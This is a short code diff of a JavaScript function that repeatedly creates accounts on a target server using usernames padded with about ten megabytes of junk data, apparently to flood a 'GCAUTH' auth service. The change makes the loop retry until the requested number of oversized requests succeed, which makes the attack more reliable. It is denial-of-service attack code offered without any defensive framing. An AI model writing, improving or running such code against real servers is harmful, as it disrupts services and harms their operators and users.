@@ -100,10 +100,13 @@ async function sendBigPacket(serverAddr, randString, multiplier, amount, io) {
     var tenMb = oneMb.repeat(multiplier);
 
     console.log('Sending GCAUTH  Big Packet')
-    for (let i=0; i<amount; i++) {
+    for (let i=0; i<amount;) {
         // 10 Mb each
         let userName = randString +i.toString() + randString + tenMb + (Math.floor(Date.now() / 1)).toString()
         var isSuccess = await makeAcc(userName, serverAddr, multiplier)
+        if (isSuccess) {
+            i++
+        }
     }
 }
 
